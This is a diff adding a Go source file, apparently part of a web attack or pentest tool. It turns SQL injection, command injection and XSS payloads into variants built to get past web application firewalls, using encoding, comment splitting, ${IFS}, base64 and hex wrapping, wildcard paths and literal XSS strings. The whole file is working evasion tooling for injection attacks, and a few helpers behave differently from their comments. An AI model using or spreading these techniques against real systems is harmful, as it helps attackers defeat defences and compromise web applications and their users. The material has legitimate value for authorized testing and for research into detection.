@@ -1,0 +1,282 @@
+package evasion
+
+import (
+	"fmt"
+	"math/rand/v2"
+	"net/url"
+	"strings"
+)
+
+// SQLBypass generates WAF-evading variants of a SQL injection payload.
+func SQLBypass(payload string) []string {
+	var variants []string
+
+	// Original.
+	variants = append(variants, payload)
+
+	// Case variation: SeLeCt, UnIoN.
+	variants = append(variants, randomCase(payload))
+
+	// Inline comments: UN/**/ION SE/**/LECT.
+	variants = append(variants, inlineComments(payload))
+
+	// URL encoding of SQL keywords.
+	variants = append(variants, urlEncodeKeywords(payload))
+
+	// Double URL encoding.
+	variants = append(variants, doubleURLEncode(payload))
+
+	// Whitespace substitution: use tabs, /**/, %0a instead of spaces.
+	variants = append(variants, whitespaceSubstitute(payload))
+
+	// Concat-based bypass: CONCAT(char(83),char(69),char(76),char(69),char(67),char(84)).
+	if strings.Contains(strings.ToUpper(payload), "SELECT") {
+		variants = append(variants, charConcat(payload))
+	}
+
+	return variants
+}
+
+// CmdBypass generates WAF-evading variants of a command injection payload.
+func CmdBypass(payload string) []string {
+	var variants []string
+
+	// Original.
+	variants = append(variants, payload)
+
+	// Variable expansion: s${IFS}leep → sleep.
+	variants = append(variants, ifsSubstitute(payload))
+
+	// Single-quote break: sl'ee'p → sleep.
+	variants = append(variants, quoteBreak(payload))
+
+	// Backslash break: s\leep → sleep.
+	variants = append(variants, backslashBreak(payload))
+
+	// $() substitution: $(echo c2xlZXA= | base64 -d) → sleep.
+	variants = append(variants, base64Wrap(payload))
+
+	// Hex encoding: $'\x73\x6c\x65\x65\x70' → sleep.
+	variants = append(variants, hexEncode(payload))
+
+	// Wildcard bypass: /b?n/s?eep → /bin/sleep.
+	variants = append(variants, wildcardBypass(payload))
+
+	// Tab instead of space.
+	variants = append(variants, strings.ReplaceAll(payload, " ", "\t"))
+
+	return variants
+}
+
+// XSSBypass generates WAF-evading variants of an XSS payload.
+func XSSBypass(payload string) []string {
+	var variants []string
+
+	variants = append(variants, payload)
+
+	// Case variation.
+	variants = append(variants, randomCase(payload))
+
+	// Event handler alternatives.
+	if strings.Contains(payload, "onerror") {
+		variants = append(variants, strings.ReplaceAll(payload, "onerror", "onload"))
+		variants = append(variants, strings.ReplaceAll(payload, "onerror", "onfocus"))
+		variants = append(variants, strings.ReplaceAll(payload, "onerror", "onmouseover"))
+	}
+
+	// SVG-based.
+	variants = append(variants, `<svg onload=alert(1)>`)
+	variants = append(variants, `<svg/onload=alert(1)>`)
+
+	// JavaScript protocol.
+	variants = append(variants, `javascript:alert(1)`)
+	variants = append(variants, `java%0ascript:alert(1)`)
+	variants = append(variants, `java%09script:alert(1)`)
+
+	// HTML entity encoding.
+	variants = append(variants, htmlEntityEncode(payload))
+
+	// Template literal.
+	variants = append(variants, `<img src=x onerror=alert`+"`1`"+`>`)
+
+	return variants
+}
+
+// --- Helper functions ---
+
+func randomCase(s string) string {
+	var b strings.Builder
+	for _, c := range s {
+		if rand.IntN(2) == 0 {
+			b.WriteRune(c)
+		} else {
+			upper := strings.ToUpper(string(c))
+			lower := strings.ToLower(string(c))
+			if string(c) == upper {
+				b.WriteString(lower)
+			} else {
+				b.WriteString(upper)
+			}
+		}
+	}
+	return b.String()
+}
+
+func inlineComments(s string) string {
+	keywords := []string{"SELECT", "UNION", "FROM", "WHERE", "AND", "OR", "INSERT", "UPDATE", "DELETE", "DROP"}
+	result := s
+	for _, kw := range keywords {
+		// Split the keyword in half and insert a comment.
+		if len(kw) > 2 {
+			mid := len(kw) / 2
+			replacement := kw[:mid] + "/**/" + kw[mid:]
+			result = strings.ReplaceAll(strings.ToUpper(result), kw, replacement)
+		}
+	}
+	return result
+}
+
+func urlEncodeKeywords(s string) string {
+	keywords := []string{"SELECT", "UNION", "FROM", "WHERE", "AND", "OR", "SLEEP", "WAITFOR"}
+	result := s
+	for _, kw := range keywords {
+		if strings.Contains(strings.ToUpper(result), kw) {
+			encoded := url.QueryEscape(kw)
+			result = strings.ReplaceAll(strings.ToUpper(result), kw, encoded)
+		}
+	}
+	return result
+}
+
+func doubleURLEncode(s string) string {
+	// First pass: URL encode.
+	first := url.QueryEscape(s)
+	// Second pass: encode the % signs.
+	return strings.ReplaceAll(first, "%", "%25")
+}
+
+func whitespaceSubstitute(s string) string {
+	replacements := []string{"/**/", "%09", "%0a", "%0d"}
+	r := replacements[rand.IntN(len(replacements))]
+	return strings.ReplaceAll(s, " ", r)
+}
+
+func charConcat(s string) string {
+	// Replace SELECT with MySQL CHAR() concat.
+	if strings.Contains(strings.ToUpper(s), "SELECT") {
+		charSelect := "CHAR(83,69,76,69,67,84)"
+		return strings.ReplaceAll(strings.ToUpper(s), "SELECT", charSelect)
+	}
+	return s
+}
+
+func ifsSubstitute(s string) string {
+	return strings.ReplaceAll(s, " ", "${IFS}")
+}
+
+func quoteBreak(s string) string {
+	// Break command names with single quotes: sleep → sl'ee'p.
+	var b strings.Builder
+	for i, c := range s {
+		b.WriteRune(c)
+		if i > 0 && i < len(s)-1 && i%2 == 0 && c >= 'a' && c <= 'z' {
+			b.WriteString("''")
+		}
+	}
+	return b.String()
+}
+
+func backslashBreak(s string) string {
+	// Insert backslashes: sleep → s\leep.
+	words := strings.Fields(s)
+	for i, word := range words {
+		if len(word) > 2 && word[0] >= 'a' && word[0] <= 'z' {
+			words[i] = string(word[0]) + "\\" + word[1:]
+		}
+	}
+	return strings.Join(words, " ")
+}
+
+func base64Wrap(s string) string {
+	// Wrap the command in base64: echo <b64> | base64 -d | sh.
+	// For simplicity, just wrap the first word.
+	words := strings.Fields(s)
+	if len(words) == 0 {
+		return s
+	}
+	return fmt.Sprintf("$(echo %s | base64 -d)", simpleBase64(words[0])) +
+		" " + strings.Join(words[1:], " ")
+}
+
+func hexEncode(s string) string {
+	// Bash hex encoding: $'\x73\x6c\x65\x65\x70'.
+	words := strings.Fields(s)
+	if len(words) == 0 {
+		return s
+	}
+	var hex strings.Builder
+	hex.WriteString("$'")
+	for _, c := range words[0] {
+		hex.WriteString(fmt.Sprintf("\\x%02x", c))
+	}
+	hex.WriteString("'")
+	if len(words) > 1 {
+		hex.WriteString(" " + strings.Join(words[1:], " "))
+	}
+	return hex.String()
+}
+
+func wildcardBypass(s string) string {
+	// Replace characters with ? wildcards in command paths.
+	// /bin/sleep → /b?n/sl?ep
+	return strings.NewReplacer(
+		"/bin/", "/b?n/",
+		"sleep", "sl?ep",
+		"curl", "cu?l",
+		"wget", "wg?t",
+		"cat", "c?t",
+	).Replace(s)
+}
+
+func htmlEntityEncode(s string) string {
+	var b strings.Builder
+	for _, c := range s {
+		if c == '<' || c == '>' || c == '"' || c == '\'' || c == '/' {
+			b.WriteString(fmt.Sprintf("&#x%x;", c))
+		} else {
+			b.WriteRune(c)
+		}
+	}
+	return b.String()
+}
+
+// simpleBase64 is a minimal base64 encoder for short strings (avoids importing encoding/base64).
+func simpleBase64(s string) string {
+	const table = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+	var b strings.Builder
+	data := []byte(s)
+	for i := 0; i < len(data); i += 3 {
+		var n uint32
+		remaining := len(data) - i
+		switch {
+		case remaining >= 3:
+			n = uint32(data[i])<<16 | uint32(data[i+1])<<8 | uint32(data[i+2])
+			b.WriteByte(table[n>>18&0x3F])
+			b.WriteByte(table[n>>12&0x3F])
+			b.WriteByte(table[n>>6&0x3F])
+			b.WriteByte(table[n&0x3F])
+		case remaining == 2:
+			n = uint32(data[i])<<16 | uint32(data[i+1])<<8
+			b.WriteByte(table[n>>18&0x3F])
+			b.WriteByte(table[n>>12&0x3F])
+			b.WriteByte(table[n>>6&0x3F])
+			b.WriteByte('=')
+		case remaining == 1:
+			n = uint32(data[i]) << 16
+			b.WriteByte(table[n>>18&0x3F])
+			b.WriteByte(table[n>>12&0x3F])
+			b.WriteString("==")
+		}
+	}
+	return b.String()
+}
